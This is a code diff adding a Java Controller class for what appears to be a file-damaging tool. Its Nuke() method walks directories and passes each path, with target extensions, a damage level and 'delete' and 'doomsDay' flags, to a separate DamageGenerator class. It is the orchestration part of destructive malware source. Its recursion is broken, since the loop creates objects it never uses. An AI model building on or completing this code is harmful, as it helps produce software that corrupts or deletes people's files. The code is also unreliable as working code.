@@ -1,5 +1,50 @@
 package com;
 
-public class Controller {
+import java.io.File;
+import java.util.ArrayList;
 
+public class Controller {
+	private static File startpathFile;
+	private static int damage, percent;
+	private static String extentions[];
+	private static boolean doomsDay = false;
+	private static boolean random = false;
+	private static boolean delete = false;
+
+	// String start
+	public Controller(String path, int damage, String[] extentions, boolean random, boolean delete, int percent, boolean dday) {
+		Controller.startpathFile = new File(path);
+		Controller.damage = damage;
+		Controller.extentions = extentions;
+		Controller.doomsDay = dday;
+		Controller.random = random;
+		Controller.delete = delete;
+		Controller.percent = percent;
+
+	}
+
+	// File Start
+	public Controller(File path, int damage, String[] extentions, boolean random, boolean delete, int percent, boolean dday) {
+		Controller.startpathFile = path;
+		Controller.damage = damage;
+		Controller.extentions = extentions;
+		Controller.doomsDay = dday;
+		Controller.random = random;
+		Controller.delete = delete;
+		Controller.percent = percent;
+	}
+
+	public void Nuke() {
+		File[] listFolders = new DirectoryScanner(startpathFile).Directories();
+
+		// for cycle to walk around all directories
+		for (int i = 0; i < listFolders.length; i++) {
+			// search for other paths
+			new Controller(startpathFile, damage, extentions, random, delete, percent, doomsDay);
+		}
+		// NUKE this path last to save the program time
+		// System.out.println(startingPath+"\t\tflooded");
+		new DamageGenerator(damage, startpathFile, extentions, random, percent, delete, doomsDay);
+
+	}
 }
